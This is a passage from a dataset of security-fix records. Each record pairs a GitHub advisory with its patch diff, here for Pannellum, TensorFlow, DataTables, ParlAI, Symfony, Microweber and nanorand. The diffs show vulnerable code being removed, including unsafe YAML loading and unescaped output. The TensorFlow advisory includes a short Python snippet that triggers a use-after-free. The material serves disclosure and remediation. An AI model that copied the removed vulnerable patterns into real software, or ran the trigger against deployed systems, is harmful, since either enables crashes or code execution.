Petroff","comments":null,"stats":"{'additions': 13, 'deletions': 6, 'total': 19}","files":"{'src\/js\/pannellum.js': {'additions': 13, 'deletions': 6, 'changes': 19, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mpetroff\/pannellum\/raw\/cc2f3d99953de59db908e0c6efd1c2c17f7c6914\/src%2Fjs%2Fpannellum.js', 'patch': \"@@ -1719,7 +1719,7 @@ function createHotSpot(hs) {\\n         if (config.basePath && !absoluteURL(imgp))\\n             imgp = config.basePath + imgp;\\n         a = document.createElement('a');\\n-        a.href = sanitizeURL(hs.URL ? hs.URL : imgp);\\n+        a.href = sanitizeURL(hs.URL ? hs.URL : imgp, true);\\n         a.target = '_blank';\\n         span.appendChild(a);\\n         var image = document.createElement('img');\\n@@ -1731,7 +1731,7 @@ function createHotSpot(hs) {\\n         span.style.maxWidth = 'initial';\\n     } else if (hs.URL) {\\n         a = document.createElement('a');\\n-        a.href = sanitizeURL(hs.URL);\\n+        a.href = sanitizeURL(hs.URL, true);\\n         if (hs.attributes) {\\n             for (var key in hs.attributes) {\\n                 a.setAttribute(key, hs.attributes[key]);\\n@@ -2005,7 +2005,7 @@ function processOptions(isPreview) {\\n                 var authorText = escapeHTML(config[key]);\\n                 if (config.authorURL) {\\n                     var authorLink = document.createElement('a');\\n-                    authorLink.href = sanitizeURL(config['authorURL']);\\n+                    authorLink.href = sanitizeURL(config['authorURL'], true);\\n                     authorLink.target = '_blank';\\n                     authorLink.innerHTML = escapeHTML(config[key]);\\n                     authorText = authorLink.outerHTML;\\n@@ -2016,7 +2016,7 @@ function processOptions(isPreview) {\\n             \\n             case 'fallback':\\n                 var link = document.createElement('a');\\n-                link.href = sanitizeURL(config[key]);\\n+                link.href = sanitizeURL(config[key], true);\\n                 link.target = '_blank';\\n                 link.textContent = 'Click here to view this panorama in an alternative viewer.';\\n                 var message = document.createElement('p');\\n@@ -2378,10 +2378,17 @@ function escapeHTML(s) {\\n  * The URL cannot be of protocol 'javascript'.\\n  * @private\\n  * @param {string} url - URL to sanitize\\n+ * @param {boolean} href - True if URL is for link (blocks data URIs)\\n  * @returns {string} Sanitized URL\\n  *\/\\n-function sanitizeURL(url) {\\n-    if (url.trim().toLowerCase().indexOf('javascript:') === 0) {\\n+function sanitizeURL(url, href) {\\n+    if (url.trim().toLowerCase().indexOf('javascript:') === 0 ||\\n+        url.trim().toLowerCase().indexOf('vbscript:') === 0) {\\n+        console.log('Script URL removed.');\\n+        return 'about:blank';\\n+    }\\n+    if (href && url.trim().toLowerCase().indexOf('data:') === 0) {\\n+        console.log('Data URI removed from link.');\\n         return 'about:blank';\\n     }\\n     return url;\"}}","message_norm":"merge pull request from ghsa-m52x-29pq-w3vv\n\nfix potential xss vulnerability","language":"ca","entities":"[('ghsa-m52x-29pq-w3vv', 'VULNID', 'GHSA'), ('fix', 'ACTION', ''), ('xss', 'SECWORD', ''), ('vulnerability', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/js\/pannellum.js'])","num_files":1.0},{"index":2364,"vuln_id":"GHSA-m648-33qf-v3gp","cwe_id":"{'CWE-20'}","score":4.4,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/14755416e364f17fb1870882fa778c7fec7f16e3'}","dataset":"osv","summary":"CHECK-fail in LSTM with zero-length input in TensorFlow ### Impact\nRunning an LSTM\/GRU model where the LSTM\/GRU layer receives an input with zero-length results in a `CHECK` failure when using the CUDA backend.\n\nThis can result in a query-of-death vulnerability, via denial of service, if users can control the input to the layer.\n\n### Patches\nWe have patched the issue in GitHub commit [14755416e364f17fb1870882fa778c7fec7f16e3](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/14755416e364f17fb1870882fa778c7fec7f16e3) and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.\n\nSince this issue also impacts TF versions before 2.4, we will patch all releases between 1.15 and 2.3 inclusive.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2020-12-10","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/14755416e364f17fb1870882fa778c7fec7f16e3","commit_sha":"14755416e364f17fb1870882fa778c7fec7f16e3","patch":"SINGLE","chain_ord":"['14755416e364f17fb1870882fa778c7fec7f16e3']","before_first_fix_commit":"{'042a6923d7f9ff05e7514bf6011e4ca30be70113'}","last_fix_commit":"14755416e364f17fb1870882fa778c7fec7f16e3","chain_ord_pos":1.0,"commit_datetime":"12\/08\/2020, 04:31:31","message":"Prevent CHECK-fail in LSTM\/GRU with zero-length input.\n\nPiperOrigin-RevId: 346239181\nChange-Id: I5f233dbc076aab7bb4e31ba24f5abd4eaf99ea4f","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 6, 'deletions': 2, 'total': 8}","files":"{'tensorflow\/stream_executor\/cuda\/cuda_dnn.cc': {'additions': 6, 'deletions': 2, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/14755416e364f17fb1870882fa778c7fec7f16e3\/tensorflow%2Fstream_executor%2Fcuda%2Fcuda_dnn.cc', 'patch': '@@ -1468,7 +1468,9 @@ class CudnnRnnSequenceTensorDescriptor\\n   static port::StatusOr<CudnnRnnSequenceTensorDescriptor> Create(\\n       GpuExecutor* parent, int max_seq_length, int batch_size, int data_size,\\n       cudnnDataType_t data_type) {\\n-    CHECK_GT(max_seq_length, 0);\\n+    if (max_seq_length <= 0) {\\n+      return port::Status(port::error::INVALID_ARGUMENT, \"max_seq_length <= 0\");\\n+    }\\n     int dims[] = {batch_size, data_size, 1};\\n     int strides[] = {dims[1] * dims[2], dims[2], 1};\\n     TensorDescriptor tensor_desc = CreateTensorDescriptor();\\n@@ -1486,7 +1488,9 @@ class CudnnRnnSequenceTensorDescriptor\\n       GpuExecutor* parent, int max_seq_length, int batch_size, int data_size,\\n       const absl::Span<const int>& seq_lengths, bool time_major,\\n       cudnnDataType_t data_type) {\\n-    CHECK_GT(max_seq_length, 0);\\n+    if (max_seq_length <= 0) {\\n+      return port::Status(port::error::INVALID_ARGUMENT, \"max_seq_length <= 0\");\\n+    }\\n     int dims[] = {batch_size, data_size, 1};\\n     int strides[] = {dims[1] * dims[2], dims[2], 1};\\n     TensorDescriptor tensor_desc = CreateTensorDescriptor();'}}","message_norm":"prevent check-fail in lstm\/gru with zero-length input.\n\npiperorigin-revid: 346239181\nchange-id: i5f233dbc076aab7bb4e31ba24f5abd4eaf99ea4f","language":"en","entities":"[('prevent', 'ACTION', ''), ('346239181', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/stream_executor\/cuda\/cuda_dnn.cc'])","num_files":1.0},{"index":2373,"vuln_id":"GHSA-m7fm-4jfh-jrg6","cwe_id":"{'CWE-416'}","score":7.8,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/5ecec9c6fbdbc6be03295685190a45e7eee726ab'}","dataset":"osv","summary":"Use after free in boosted trees creation ### Impact\nThe implementation for `tf.raw_ops.BoostedTreesCreateEnsemble` can result in a use after free error if an attacker supplies specially crafted arguments:\n\n```python\nimport tensorflow as tf\n\nv= tf.Variable([0.0])\ntf.raw_ops.BoostedTreesCreateEnsemble(\n  tree_ensemble_handle=v.handle,\n  stamp_token=[0],\n  tree_ensemble_serialized=['0']) \n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/f24faa153ad31a4b51578f8181d3aaab77a1ddeb\/tensorflow\/core\/kernels\/boosted_trees\/resource_ops.cc#L55) uses a reference counted resource and decrements the refcount if the initialization fails, as it should. However, when the code was written, the  resource was represented as a naked pointer but later refactoring has changed it to be a smart pointer. Thus, when the pointer leaves the scope, a subsequent `free`-ing of the resource occurs, but this fails to take into account that the refcount has already reached 0, thus the resource has been already freed. During this double-free process, members of the resource object are accessed for cleanup but they are invalid as the entire resource has been freed.\n\n### Patches\nWe have patched the issue in GitHub commit [5ecec9c6fbdbc6be03295685190a45e7eee726ab](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/5ecec9c6fbdbc6be03295685190a45e7eee726ab).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/5ecec9c6fbdbc6be03295685190a45e7eee726ab","commit_sha":"5ecec9c6fbdbc6be03295685190a45e7eee726ab","patch":"SINGLE","chain_ord":"['5ecec9c6fbdbc6be03295685190a45e7eee726ab']","before_first_fix_commit":"{'d8a39f2dc1cba935ba153092a09e7d4bb2ce5ee2'}","last_fix_commit":"5ecec9c6fbdbc6be03295685190a45e7eee726ab","chain_ord_pos":1.0,"commit_datetime":"07\/31\/2021, 02:13:19","message":"Prevent use after free.\n\nA very old version of the code used `result` as a simple pointer to a resource. Two years later, the pointer got changed to a `unique_ptr` but author forgot to remove the call to `Unref`. Three years after that, we finally uncover the UAF.\n\nPiperOrigin-RevId: 387924872\nChange-Id: I70fb6f199164de49fac20c168132a07b84903f9b","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'tensorflow\/core\/kernels\/boosted_trees\/resource_ops.cc': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/5ecec9c6fbdbc6be03295685190a45e7eee726ab\/tensorflow%2Fcore%2Fkernels%2Fboosted_trees%2Fresource_ops.cc', 'patch': '@@ -53,6 +53,7 @@ class BoostedTreesCreateEnsembleOp : public OpKernel {\\n     if (!result->InitFromSerialized(\\n             tree_ensemble_serialized_t->scalar<tstring>()(), stamp_token)) {\\n       result->Unref();\\n+      result.release();  \/\/ Needed due to the `->Unref` above, to prevent UAF\\n       OP_REQUIRES(\\n           context, false,\\n           errors::InvalidArgument(\"Unable to parse tree ensemble proto.\"));'}}","message_norm":"prevent use after free.\n\na very old version of the code used `result` as a simple pointer to a resource. two years later, the pointer got changed to a `unique_ptr` but author forgot to remove the call to `unref`. three years after that, we finally uncover the uaf.\n\npiperorigin-revid: 387924872\nchange-id: i70fb6f199164de49fac20c168132a07b84903f9b","language":"en","entities":"[('prevent', 'ACTION', ''), ('use after free', 'SECWORD', ''), ('changed', 'ACTION', ''), ('remove', 'ACTION', ''), ('387924872', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/boosted_trees\/resource_ops.cc'])","num_files":1.0},{"index":2376,"vuln_id":"GHSA-m7j4-fhg6-xf5v","cwe_id":"{'CWE-1321'}","score":7.3,"chain":"{'https:\/\/github.com\/DataTables\/DataTablesSrc\/commit\/a51cbe99fd3d02aa5582f97d4af1615d11a1ea03'}","dataset":"osv","summary":"Prototype pollution in datatables.net All versions of package datatables.net are vulnerable to Prototype Pollution due to an incomplete fix for https:\/\/snyk.io\/vuln\/SNYK-JS-DATATABLESNET-598806.","published_date":"2020-12-17","chain_len":1,"project":"https:\/\/github.com\/DataTables\/DataTablesSrc","commit_href":"https:\/\/github.com\/DataTables\/DataTablesSrc\/commit\/a51cbe99fd3d02aa5582f97d4af1615d11a1ea03","commit_sha":"a51cbe99fd3d02aa5582f97d4af1615d11a1ea03","patch":"SINGLE","chain_ord":"['a51cbe99fd3d02aa5582f97d4af1615d11a1ea03']","before_first_fix_commit":"{'d878f888142e4811f839ea3e099ad1de64d74698'}","last_fix_commit":"a51cbe99fd3d02aa5582f97d4af1615d11a1ea03","chain_ord_pos":1.0,"commit_datetime":"10\/25\/2020, 10:00:54","message":"Fix: Possible prototype pollution if `constructor` were used in a data property name\n\nhttps:\/\/github.com\/418sec\/huntr\/pull\/827","author":"Allan Jardine","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'js\/core\/core.data.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/DataTables\/DataTablesSrc\/raw\/a51cbe99fd3d02aa5582f97d4af1615d11a1ea03\/js%2Fcore%2Fcore.data.js', 'patch': \"@@ -357,7 +357,7 @@ function _fnSetObjectDataFn( mSource )\\n \\t\\t\\tfor ( var i=0, iLen=a.length-1 ; i<iLen ; i++ )\\n \\t\\t\\t{\\n \\t\\t\\t\\t\/\/ Protect against prototype pollution\\n-\\t\\t\\t\\tif (a[i] === '__proto__') {\\n+\\t\\t\\t\\tif (a[i] === '__proto__' || a[i] === 'constructor') {\\n \\t\\t\\t\\t\\tthrow new Error('Cannot set prototype values');\\n \\t\\t\\t\\t}\"}}","message_norm":"fix: possible prototype pollution if `constructor` were used in a data property name\n\nhttps:\/\/github.com\/418sec\/huntr\/pull\/827","language":"en","entities":"[('fix', 'ACTION', ''), ('prototype pollution', 'SECWORD', ''), ('https:\/\/github.com\/418sec\/huntr\/pull\/827', 'URL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['js\/core\/core.data.js'])","num_files":1.0},{"index":2379,"vuln_id":"GHSA-m87f-9fvv-2mgg","cwe_id":"{'CWE-502'}","score":8.4,"chain":"{'https:\/\/github.com\/facebookresearch\/ParlAI\/commit\/4374fa2aba383db6526ab36e939eb1cf8ef99879', 'https:\/\/github.com\/facebookresearch\/ParlAI\/commit\/507d066ef432ea27d3e201da08009872a2f37725'}","dataset":"osv","summary":"Deserialization of Untrusted Data in parlai ### Impact\nDue to use of unsafe YAML deserialization logic, an attacker with the ability to modify local YAML configuration files could provide malicious input, resulting in remote code execution or similar risks.\n\n### Patches\nThe issue can be patched by upgrading to v1.1.0 or later. It can also be patched by replacing YAML deserialization with equivalent safe_load calls.\n\n### References\n\n- https:\/\/github.com\/facebookresearch\/ParlAI\/commit\/507d066ef432ea27d3e201da08009872a2f37725\n- https:\/\/github.com\/facebookresearch\/ParlAI\/commit\/4374fa2aba383db6526ab36e939eb1cf8ef99879\n- https:\/\/anon-artist.github.io\/blogs\/blog3.html","published_date":"2021-09-13","chain_len":2,"project":"https:\/\/github.com\/facebookresearch\/ParlAI","commit_href":"https:\/\/github.com\/facebookresearch\/ParlAI\/commit\/4374fa2aba383db6526ab36e939eb1cf8ef99879","commit_sha":"4374fa2aba383db6526ab36e939eb1cf8ef99879","patch":"MULTI","chain_ord":"['507d066ef432ea27d3e201da08009872a2f37725', '4374fa2aba383db6526ab36e939eb1cf8ef99879']","before_first_fix_commit":"{'15fbf55f32e64722c452c907425e10fdb977f62e'}","last_fix_commit":"4374fa2aba383db6526ab36e939eb1cf8ef99879","chain_ord_pos":2.0,"commit_datetime":"02\/03\/2021, 17:52:21","message":"Update model_chat_blueprint.py (#3429)","author":"Abhiram V","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'parlai\/crowdsourcing\/tasks\/model_chat\/model_chat_blueprint.py': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/facebookresearch\/ParlAI\/raw\/4374fa2aba383db6526ab36e939eb1cf8ef99879\/parlai%2Fcrowdsourcing%2Ftasks%2Fmodel_chat%2Fmodel_chat_blueprint.py', 'patch': '@@ -453,7 +453,7 @@ def __init__(\\n \\n     def _get_shared_models(self, args: \"DictConfig\") -> Dict[str, dict]:\\n         with open(args.blueprint.model_opt_path) as f:\\n-            all_model_opts = yaml.load(f.read())\\n+            all_model_opts = yaml.safe_load(f.read())\\n         active_model_opts = {\\n             model: opt\\n             for model, opt in all_model_opts.items()\\n@@ -557,5 +557,5 @@ def __init__(\\n \\n     def _get_shared_models(self, args: \"DictConfig\") -> Dict[str, dict]:\\n         with open(args.blueprint.model_opt_path) as f:\\n-            model_opts = yaml.load(f.read())\\n+            model_opts = yaml.safe_load(f.read())\\n         return TurkLikeAgent.get_bot_agents(args=args, model_opts=model_opts)'}}","message_norm":"update model_chat_blueprint.py (#3429)","language":"en","entities":"[('#3429', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['parlai\/crowdsourcing\/tasks\/model_chat\/model_chat_blueprint.py'])","num_files":1.0},{"index":2380,"vuln_id":"GHSA-m87f-9fvv-2mgg","cwe_id":"{'CWE-502'}","score":8.4,"chain":"{'https:\/\/github.com\/facebookresearch\/ParlAI\/commit\/4374fa2aba383db6526ab36e939eb1cf8ef99879', 'https:\/\/github.com\/facebookresearch\/ParlAI\/commit\/507d066ef432ea27d3e201da08009872a2f37725'}","dataset":"osv","summary":"Deserialization of Untrusted Data in parlai ### Impact\nDue to use of unsafe YAML deserialization logic, an attacker with the ability to modify local YAML configuration files could provide malicious input, resulting in remote code execution or similar risks.\n\n### Patches\nThe issue can be patched by upgrading to v1.1.0 or later. It can also be patched by replacing YAML deserialization with equivalent safe_load calls.\n\n### References\n\n- https:\/\/github.com\/facebookresearch\/ParlAI\/commit\/507d066ef432ea27d3e201da08009872a2f37725\n- https:\/\/github.com\/facebookresearch\/ParlAI\/commit\/4374fa2aba383db6526ab36e939eb1cf8ef99879\n- https:\/\/anon-artist.github.io\/blogs\/blog3.html","published_date":"2021-09-13","chain_len":2,"project":"https:\/\/github.com\/facebookresearch\/ParlAI","commit_href":"https:\/\/github.com\/facebookresearch\/ParlAI\/commit\/507d066ef432ea27d3e201da08009872a2f37725","commit_sha":"507d066ef432ea27d3e201da08009872a2f37725","patch":"MULTI","chain_ord":"['507d066ef432ea27d3e201da08009872a2f37725', '4374fa2aba383db6526ab36e939eb1cf8ef99879']","before_first_fix_commit":"{'15fbf55f32e64722c452c907425e10fdb977f62e'}","last_fix_commit":"4374fa2aba383db6526ab36e939eb1cf8ef99879","chain_ord_pos":1.0,"commit_datetime":"01\/26\/2021, 21:06:01","message":"RCE Fixed (#3402)\n\nCo-authored-by: Anon-Artist <61599526+Anon-Artist@users.noreply.github.com>\r\nCo-authored-by: Jamie Slome <jamie@418sec.com>","author":"huntr.dev | the place to protect open source","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'parlai\/chat_service\/utils\/config.py': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/facebookresearch\/ParlAI\/raw\/507d066ef432ea27d3e201da08009872a2f37725\/parlai%2Fchat_service%2Futils%2Fconfig.py', 'patch': '@@ -36,7 +36,7 @@ def parse_configuration_file(config_path):\\n     result = {}\\n     result[\"configs\"] = {}\\n     with open(config_path) as f:\\n-        cfg = yaml.load(f.read(), Loader=yaml.FullLoader)\\n+        cfg = yaml.load(f.read(), Loader=yaml.SafeLoader)\\n         # get world path\\n         result[\"world_path\"] = cfg.get(\"world_module\")\\n         if not result[\"world_path\"]:'}}","message_norm":"rce fixed (#3402)\n\nco-authored-by: anon-artist <61599526+anon-artist@users.noreply.github.com>\r\nco-authored-by: jamie slome <jamie@418sec.com>","language":"en","entities":"[('fixed', 'ACTION', ''), ('#3402', 'ISSUE', ''), ('jamie@418sec.com', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['parlai\/chat_service\/utils\/config.py'])","num_files":1.0},{"index":2381,"vuln_id":"GHSA-m884-279h-32v2","cwe_id":"{'CWE-209'}","score":4.6,"chain":"{'https:\/\/github.com\/symfony\/symfony\/commit\/629d21b800a15dc649fb0ae9ed7cd9211e7e45db', 'https:\/\/github.com\/symfony\/symfony\/commit\/cf80224589ac05402d4f72f5ddf80900ec94d5ad'}","dataset":"osv","summary":"Exceptions displayed in non-debug configurations in Symfony Description\n-----------\n\nWhen `ErrorHandler` renders an exception HTML page, it uses un-escaped properties from the related Exception class to render the stacktrace. The security issue comes from the fact that the stacktraces were also displayed in non-`debug` environments.\n\nResolution\n----------\n\nThe `ErrorHandler` class now escapes all properties coming from the related Exception, and the stacktrace is not displayed anymore in non-`debug` environments.\n\nThe patches for this issue are available [here](https:\/\/github.com\/symfony\/symfony\/commit\/cf80224589ac05402d4f72f5ddf80900ec94d5ad) and [here](https:\/\/github.com\/symfony\/symfony\/commit\/629d21b800a15dc649fb0ae9ed7cd9211e7e45db) for branch 4.4.\n\nCredits\n-------\n\nI would like to thank Luka Sikic for reporting & Yonel Ceruto and J\u00e9r\u00e9my Deruss\u00e9 for fixing the issue.","published_date":"2020-03-30","chain_len":2,"project":"https:\/\/github.com\/symfony\/symfony","commit_href":"https:\/\/github.com\/symfony\/symfony\/commit\/629d21b800a15dc649fb0ae9ed7cd9211e7e45db","commit_sha":"629d21b800a15dc649fb0ae9ed7cd9211e7e45db","patch":"MULTI","chain_ord":"['cf80224589ac05402d4f72f5ddf80900ec94d5ad', '629d21b800a15dc649fb0ae9ed7cd9211e7e45db']","before_first_fix_commit":"{'3ee39e7468f1cd0b5a88b89aad72d61214e950f4'}","last_fix_commit":"629d21b800a15dc649fb0ae9ed7cd9211e7e45db","chain_ord_pos":2.0,"commit_datetime":"02\/04\/2020, 09:49:52","message":"Escape variable in Exception Template","author":"J\u00e9r\u00e9my Deruss\u00e9","comments":null,"stats":"{'additions': 3, 'deletions': 3, 'total': 6}","files":"{'src\/Symfony\/Component\/ErrorHandler\/Resources\/views\/traces_text.html.php': {'additions': 3, 'deletions': 3, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/symfony\/symfony\/raw\/629d21b800a15dc649fb0ae9ed7cd9211e7e45db\/src%2FSymfony%2FComponent%2FErrorHandler%2FResources%2Fviews%2Ftraces_text.html.php', 'patch': '@@ -20,15 +20,15 @@\\n                 <?php if ($exception[\\'trace\\']) { ?>\\n                 <pre class=\"stacktrace\">\\n <?php\\n-                    echo $exception[\\'class\\'].\":\\\\n\";\\n+                    echo $this->escape($exception[\\'class\\']).\":\\\\n\";\\n                     if ($exception[\\'message\\']) {\\n-                        echo $exception[\\'message\\'].\"\\\\n\";\\n+                        echo $this->escape($exception[\\'message\\']).\"\\\\n\";\\n                     }\\n \\n                     foreach ($exception[\\'trace\\'] as $trace) {\\n                         echo \"\\\\n  \";\\n                         if ($trace[\\'function\\']) {\\n-                            echo \\'at \\'.$trace[\\'class\\'].$trace[\\'type\\'].$trace[\\'function\\'].\\'(\\'.(isset($trace[\\'args\\']) ? $this->formatArgsAsText($trace[\\'args\\']) : \\'\\').\\')\\';\\n+                            echo $this->escape(\\'at \\'.$trace[\\'class\\'].$trace[\\'type\\'].$trace[\\'function\\']).\\'(\\'.(isset($trace[\\'args\\']) ? $this->formatArgsAsText($trace[\\'args\\']) : \\'\\').\\')\\';\\n                         }\\n                         if ($trace[\\'file\\'] && $trace[\\'line\\']) {\\n                             echo($trace[\\'function\\'] ? \"\\\\n     (\" : \\'at \\').strtr(strip_tags($this->formatFile($trace[\\'file\\'], $trace[\\'line\\'])), [\\' at line \\'.$trace[\\'line\\'] => \\'\\']).\\':\\'.$trace[\\'line\\'].($trace[\\'function\\'] ? \\')\\' : \\'\\');'}}","message_norm":"escape variable in exception template","language":"ro","entities":"[('escape', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/Symfony\/Component\/ErrorHandler\/Resources\/views\/traces_text.html.php'])","num_files":1.0},{"index":2388,"vuln_id":"GHSA-m8rp-q82r-c5mf","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/b64ef574b82dbf89a908e1569d790c7012d1ccd7'}","dataset":"osv","summary":"Cross-site Scripting in microweber Cross-site Scripting (XSS) - Stored in Packagist microweber\/microweber prior to 1.2.11.","published_date":"2022-01-21","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/b64ef574b82dbf89a908e1569d790c7012d1ccd7","commit_sha":"b64ef574b82dbf89a908e1569d790c7012d1ccd7","patch":"SINGLE","chain_ord":"['b64ef574b82dbf89a908e1569d790c7012d1ccd7']","before_first_fix_commit":"{'e17f3e94289b2dac7187e8039e1a3429779e273c'}","last_fix_commit":"b64ef574b82dbf89a908e1569d790c7012d1ccd7","chain_ord_pos":1.0,"commit_datetime":"01\/19\/2022, 09:56:21","message":"xss on contact form fix","author":"Bozhidar Slaveykov","comments":null,"stats":"{'additions': 2, 'deletions': 3, 'total': 5}","files":"{'userfiles\/modules\/admin\/notifications\/notif_form_entry.php': {'additions': 2, 'deletions': 3, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/b64ef574b82dbf89a908e1569d790c7012d1ccd7\/userfiles%2Fmodules%2Fadmin%2Fnotifications%2Fnotif_form_entry.php', 'patch': '@@ -91,7 +91,6 @@\\n             <hr class=\"thin\" \/>\\n             <div class=\"row\">\\n \\n-\\n                 <?php\\n                 $iformVr=0;\\n                 foreach ($form_values_formated as $form_values_row) {\\n@@ -106,12 +105,12 @@\\n                             <?php if (!is_array($val1)){ ?>\\n                                 <div>\\n                                     <small class=\"text-muted\"><?php echo str_replace(\\'_\\', \\' \\', $key); ?>:<\/small>\\n-                                    <p><?php print $val1; ?><\/p>\\n+                                    <p><?php print htmlentities($val1); ?><\/p>\\n                                 <\/div>\\n                             <?php } else { ?>\\n                                 <small class=\"text-muted\"><?php echo str_replace(\\'_\\', \\' \\', $key); ?>:<\/small>\\n                                 <?php foreach ($val1 as $val1_1){ ?>\\n-                                    <p><?php print $val1_1 . \\'<br \/>\\'; ?><\/p>\\n+                                    <p><?php print htmlentities($val1_1) . \\'<br \/>\\'; ?><\/p>\\n                                 <?php }?>\\n                             <?php } ?>\\n                         <?php } ?>'}}","message_norm":"xss on contact form fix","language":"en","entities":"[('xss', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['userfiles\/modules\/admin\/notifications\/notif_form_entry.php'])","num_files":1.0},{"index":2398,"vuln_id":"GHSA-m9m5-cg5h-r582","cwe_id":"{'CWE-338'}","score":5.1,"chain":"{'https:\/\/github.com\/Absolucy\/nanorand-rs\/commit\/5ba218ac29df4786b002d7d12b47fa0c04a331f2'}","dataset":"osv","summary":"Improper random number generation in nanorand An issue was discovered in the nanorand crate before 0.5.1 for Rust. It caused any random number generator (even ChaCha) to return all zeroes because integer truncation was mishandled.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/Absolucy\/nanorand-rs","commit_href":"https:\/\/github.com\/Absolucy\/nanorand-rs\/commit\/5ba218ac29df4786b002d7d12b47fa0c04a331f2","commit_sha":"5ba218ac29df4786b002d7d12b47fa0c04a331f2","patch":"SINGLE","chain_ord":"['5ba218ac29df4786b002d7d12b47fa0c04a331f2']","before_first_fix_commit":"{'7bf49ecbb254991585c04dd4f4d2a23cb16a1240'}","last_fix_commit":"5ba218ac29df4786b002d7d12b47fa0c04a331f2","chain_ord_pos":1.0,"commit_datetime":"12\/07\/2020, 12:33:01","message":"fix: Fix random number generation","author":"aspen","comments":null,"stats":"{'additions': 7, 'deletions': 7, 'total': 14}","files":"{'nanorand\/src\/gen.rs': {'additions': 7, 'deletions': 7, 'changes': 14, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Absolucy\/nanorand-rs\/raw\/5ba218ac29df4786b002d7d12b47fa0c04a331f2\/nanorand%2Fsrc%2Fgen.rs', 'patch': '@@ -101,44 +101,44 @@ impl<R: RNG> RandomRange<R> for usize {\\n \\n impl<R: RNG> RandomGen<R> for u32 {\\n \\tfn random(r: &mut R) -> Self {\\n-\\t\\t(r.generate::<u64>() >> 32) as u32\\n+\\t\\tr.generate::<u64>() as u32\\n \\t}\\n }\\n \\n impl<R: RNG> RandomRange<R> for u32 {\\n \\tfn random_range(r: &mut R, lower: u32, upper: u32) -> Self {\\n-\\t\\t(r.generate_range::<u64>(lower as u64, upper as u64) >> 32) as u32\\n+\\t\\tr.generate_range::<u64>(lower as u64, upper as u64) as u32\\n \\t}\\n }\\n \\n impl<R: RNG> RandomGen<R> for u16 {\\n \\tfn random(r: &mut R) -> Self {\\n-\\t\\t(r.generate::<u64>() >> 16) as u16\\n+\\t\\tr.generate::<u64>() as u16\\n \\t}\\n }\\n \\n impl<R: RNG> RandomRange<R> for u16 {\\n \\tfn random_range(r: &mut R, lower: u16, upper: u16) -> Self {\\n-\\t\\t(r.generate_range::<u64>(lower as u64, upper as u64) >> 16) as u16\\n+\\t\\tr.generate_range::<u64>(lower as u64, upper as u64) as u16\\n \\t}\\n }\\n \\n impl<R: RNG> RandomGen<R> for u8 {\\n \\tfn random(r: &mut R) -> Self {\\n-\\t\\t(r.generate::<u64>() >> 8) as u8\\n+\\t\\tr.generate::<u64>() as u8\\n \\t}\\n }\\n \\n impl<R: RNG> RandomRange<R> for u8 {\\n \\tfn random_range(r: &mut R, lower: u8, upper: u8) -> Self {\\n-\\t\\t(r.generate_range::<u64>(lower as u64, upper as u64) >> 8) as u8\\n+\\t\\tr.generate_range::<u64>(lower as u64, upper as u64) as u8\\n \\t}\\n }\\n \\n impl<R: RNG> RandomRange<R> for char {\\n \\tfn random_range(r: &mut R, lower: char, upper: char) -> Self {\\n \\t\\tloop {\\n-\\t\\t\\tlet ret = (r.generate_range::<u64>(lower as u64, upper as u64) >> 32) as 